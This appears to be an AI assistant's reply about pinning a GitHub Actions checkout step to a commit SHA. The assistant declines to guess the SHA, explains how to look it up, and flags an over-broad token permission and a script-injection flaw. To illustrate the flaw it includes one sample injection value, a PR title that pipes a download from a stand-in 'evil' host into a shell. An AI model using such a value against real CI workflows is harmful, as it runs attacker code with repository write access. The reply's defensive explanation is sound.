I haven't pinned anything yet, because I can't look up the commit SHA that `v4` points to. I have no shell or network access here, and a SHA written from memory could be wrong or point at the wrong commit. Nothing else in the repo records one either.

There's one workflow, `.github/workflows/deploy.yml`, and one action in it: `actions/checkout@v4` on line 13.

To get the SHA, run this:

```
gh api repos/actions/checkout/commits/v4 --jq .sha
```

Or use `git ls-remote https://github.com/actions/checkout 'refs/tags/v4*'`. If the tag is annotated, use the `^{}` line, which is the commit.

Either paste the SHA here or give me shell access, and I'll make the edit. The line would become:

```yaml
- uses: actions/checkout@<40-char-sha> # v4.x.x
```

The workflow has two other problems that matter more than pinning:
- **`permissions: write-all`:** this gives the `GITHUB_TOKEN` write access to everything. It should be `contents: read`, plus any specific scopes the job needs.
- **Script injection on line 14:** `${{ github.event.pull_request.title }}` is interpolated straight into a shell command. A PR title like `"; curl evil|sh #` would run arbitrary code, and with write-all that code would have a write token. Pass the title through an environment variable instead, for example `env: TITLE: ${{ github.event.pull_request.title }}` and then `echo "Title is $TITLE"`.

I can fix both of these in the same edit if you want.
